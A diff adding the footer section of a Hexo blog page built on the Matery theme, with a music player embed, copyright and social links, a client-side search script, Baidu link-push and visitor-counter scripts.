+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">152.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/playZG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:playzg@aliyun.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1351802079" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1351802079" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
